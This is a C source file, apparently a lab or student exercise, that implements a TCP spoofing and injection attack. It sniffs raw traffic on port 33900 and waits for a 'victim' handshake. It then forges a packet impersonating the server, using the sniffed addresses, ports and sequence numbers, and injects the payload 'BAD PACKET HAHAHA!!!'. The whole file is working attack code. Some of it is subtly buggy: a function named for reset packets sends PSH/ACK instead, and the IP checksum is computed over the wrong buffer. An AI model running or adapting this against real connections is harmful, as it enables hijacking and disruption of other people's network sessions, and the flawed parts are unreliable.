#include <netinet/in.h>
#include <errno.h>
#include <netdb.h>
#include <stdio.h>  //For standard things
#include <stdlib.h> //malloc
#include <stdbool.h>
#include <string.h>           //strlen
#include <netinet/ip_icmp.h>  //Provides declarations for icmp header
#include <netinet/udp.h>      //Provides declarations for udp header
#include <netinet/tcp.h>      //Provides declarations for tcp header
#include <netinet/ip.h>       //Provides declarations for ip header
#include <netinet/if_ether.h> //For ETH_P_ALL
#include <net/ethernet.h>     //For ether_header
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <sys/time.h>
#include <sys/types.h>
#include <unistd.h>

#define PORT 33900 // the port users will be connecting to
#define BUFFERSIZE 4096
#define DATA "BAD PACKET HAHAHA!!!"

int check_victim(int *, unsigned char *);
in_addr_t craft_rst_packet(char*, unsigned char*);
void fill_ip_header(struct iphdr*, char*, unsigned char*);
void fill_tcp_header(struct tcphdr*, char*, unsigned char*);
int get_victim_port(unsigned char*);
unsigned short csum(unsigned short *, int);

//Pseudo header needed for calculating the TCP header checksum
struct pseudoTCPPacket
{
    uint32_t srcAddr;
    uint32_t dstAddr;
    uint8_t zero;
    uint8_t protocol;
    uint16_t TCP_len;
};

int main(int argc, char *argv[])
{
    int saddr_size, data_size;
    struct sockaddr saddr;

    unsigned char *buffer = (unsigned char *)malloc(65536); //Its Big!

    printf("Starting...\n");

    int sock_raw = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    //setsockopt(sock_raw , SOL_SOCKET , SO_BINDTODEVICE , "eth0" , strlen("eth0")+ 1 );

    if (sock_raw < 0)
    {
        //Print the error with proper message
        perror("Socket Error");
        return 1;
    }
    int flag_count = 0;
    while (1)
    {
        saddr_size = sizeof(saddr);
        //Receive a packet
        data_size = recvfrom(sock_raw, buffer, 65536, 0, &saddr, (socklen_t *)&saddr_size);
        if (data_size < 0)
        {
            printf("Recvfrom error , failed to get packets\n");
            return 1;
        }
        printf("%d\n", data_size);
        //Now process the packet to see if the tcp handshake is over
        check_victim(&flag_count, buffer);
        if (flag_count == 4)
        {
            printf("starting attack");
            break;
        }
    }
    // carft the attack reset packt
    char *datagram;
    datagram = (char *)malloc(BUFFERSIZE);	
	memset(datagram,0,BUFFERSIZE);
    
    in_addr_t dst_addr = craft_rst_packet(datagram,buffer);
    int dest_port = get_victim_port(datagram);

    struct sockaddr_in dest_addr;
	dest_addr.sin_family = AF_INET;
	// dest_addr.sin_port = htons(dest_port);
	dest_addr.sin_addr.s_addr = dst_addr;

    int sockfd; // socket discriptor

    // creating a raw socket
	sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
	if (sockfd == -1) {
		perror("Failed to create socket");
		exit(-1);
	}

    //IP_HDRINCL tells the kernel to not fill up the headers' structure
	int one = 1;
	const int *val = &one;
	if (setsockopt (sockfd, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0) {
		perror("Error setting IP_HDRINCL");
		exit(-1);
	}
	sleep(1);
	//Send the packet
    int packet_size = sizeof (struct iphdr) + sizeof (struct tcphdr) + strlen(DATA); // length of the datagram
	if (sendto (sockfd, datagram, packet_size ,  0, (struct sockaddr *) &dest_addr, sizeof (dest_addr)) < 0) {
		perror("sendto failed");
        exit(-1);
	}
	//Data send successfully
	else {
		printf ("Packet Send. Length : %d \n" , packet_size);
	}

    return 1;
}

int get_victim_port(unsigned char *buffer) {
    struct iphdr *victim_iph = (struct iphdr *)(buffer + sizeof(struct ethhdr));
    unsigned short iphdrlen;
    iphdrlen = victim_iph->ihl * 4;
    struct tcphdr *victim_tcph = (struct tcphdr *)(buffer + sizeof(struct ethhdr) + iphdrlen);

    return victim_tcph->source;
}

int check_victim(int *flag_count, unsigned char *buffer)
{
    struct iphdr *iph = (struct iphdr *)(buffer + sizeof(struct ethhdr));
    unsigned short iphdrlen;
    iphdrlen = iph->ihl * 4;
    struct tcphdr *tcph = (struct tcphdr *)(buffer + sizeof(struct ethhdr) + iphdrlen);

    // printf("PRO %d\n", iph->protocol);
    // printf("A %d\n", tcph->ack);
    // printf("S %d\n", tcph->syn);
    // printf("PORT %d\n", ntohs(tcph->dest));

    bool victim_traffic = (ntohs(tcph->source) == PORT) || (ntohs(tcph->dest) == PORT);
    if (iph->protocol == 6 && victim_traffic)
    {

        if (((unsigned int)tcph->ack) == 1)
        {
            printf("ACK send");
            (*flag_count)++;
        }
        if (((unsigned int)tcph->syn) == 1)
        {
            printf("SYN send");
            (*flag_count)++;
        }
        printf("flag count: %d\n", *flag_count);

        // handshake complete can attack now
        if ((*flag_count) == 4)
        {
            return 1;
        }
    }

    return 0;
}

in_addr_t craft_rst_packet(char *datagram, unsigned char *buffer)
{
    // struc to hold IP header, pointing to the top of datagram buffer
    struct iphdr *iph = (struct iphdr *)datagram;
    // struct to hold TCP header, pointing to the postion right after ip header in datagram buffer
    struct tcphdr *tcph = (struct tcphdr *)(datagram + sizeof(struct iphdr));
    char *content; // data from the application layer
    // content points right after tcp header to store data
    content = datagram + sizeof(struct iphdr) + sizeof(struct tcphdr);
    strcpy(content, DATA);

    fill_ip_header(iph, datagram, buffer);
    fill_tcp_header(tcph, datagram, buffer);

    return iph->daddr;
}

void fill_ip_header(struct iphdr *iph, char *datagram, unsigned char *buffer)
{
    struct iphdr *victim_iph = (struct iphdr *)(buffer + sizeof(struct ethhdr));

    //Fill in the IP Header
    iph->version = 4;
    iph->ihl = 5;                                                               //ip header len
    iph->tos = 0;                                                               //ip type of service
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + strlen(DATA); // length of the datagram
    iph->id = htons(12345);                                                     //Id of this packet
    iph->frag_off = 0;                                                          // fragment offset
    iph->ttl = 255;                                                             // time to live
    iph->protocol = IPPROTO_TCP;                                                // protocol tcp
    iph->check = 0;                                                             //Set to 0 before calculating checksum
    iph->saddr = victim_iph->daddr;                                             // make it look like it came from server
    iph->daddr = victim_iph->saddr;                                             // destination ip, sniffed ip of server

    iph->check = csum((unsigned short *)buffer, iph->tot_len);
}

void fill_tcp_header(struct tcphdr *tcph, char *datagram, unsigned char *buffer)
{
    struct iphdr *victim_iph = (struct iphdr *)(buffer + sizeof(struct ethhdr));
    unsigned short iphdrlen;
    iphdrlen = victim_iph->ihl * 4;
    struct tcphdr *victim_tcph = (struct tcphdr *)(buffer + sizeof(struct ethhdr) + iphdrlen);

    // Fill in the TCP Header
    tcph->source = victim_tcph->dest; // src port (rand)
    tcph->dest = victim_tcph->source;     // dest port
    tcph->seq = victim_tcph->ack_seq;       // victim seq number
    tcph->ack_seq = victim_tcph->seq;
    // tcph->ack_seq = 0;
    tcph->res1 = 0;
    tcph->doff = 5; // tcp data offset, indicates where data begins
    tcph->fin = 0;
    tcph->syn = 0;
    tcph->rst = 0;
    tcph->psh = 1;
    tcph->ack = 1;
    tcph->urg = 0;
    tcph->window = htons(65535); /* maximum allowed window size */
    tcph->urg_ptr = 0;

    // TODO check
    tcph->check = 0; //leave checksum 0 now, filled later by stub header

    // fill in the pseudo header
    struct pseudoTCPPacket temp_hdr;
    //Now we can calculate the checksum for the TCP header
    temp_hdr.srcAddr = victim_iph->daddr;                           //32 bit format of source address
    temp_hdr.dstAddr = victim_iph->saddr;                           //32 bit format of source address
    temp_hdr.zero = 0;                                              //8 bit always zero
    temp_hdr.protocol = IPPROTO_TCP;                                //8 bit TCP protocol
    temp_hdr.TCP_len = htons(sizeof(struct tcphdr) + strlen(DATA)); // 16 bit length of TCP header

    //Populate the pseudo packet
    char *dummy_packet;
    int dummy_size = (int)(sizeof(struct pseudoTCPPacket) + sizeof(struct tcphdr) + strlen(DATA));
    dummy_packet = (char *)malloc(dummy_size);
    memset(dummy_packet, 0, dummy_size);

    //Copy pseudo header
    memcpy(dummy_packet, (char *)&temp_hdr, sizeof(struct pseudoTCPPacket));
    //Copy tcp header + data to fake TCP header for checksum
    memcpy(dummy_packet + sizeof(struct pseudoTCPPacket), tcph, sizeof(struct tcphdr) + strlen(DATA));

    tcph->check = csum((unsigned short *)dummy_packet, dummy_size);

}

// Generic checksum calculation function/
// ref: https://tools.ietf.org/html/rfc1071
unsigned short csum(unsigned short *ptr, int nbytes)
{
    register long sum;
    unsigned short oddbyte;
    register short answer;

    sum = 0;
    while (nbytes > 1)
    {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1)
    {
        oddbyte = 0;
        *((u_char *)&oddbyte) = *(u_char *)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum = sum + (sum >> 16);
    answer = (short)~sum;

    return (answer);
}
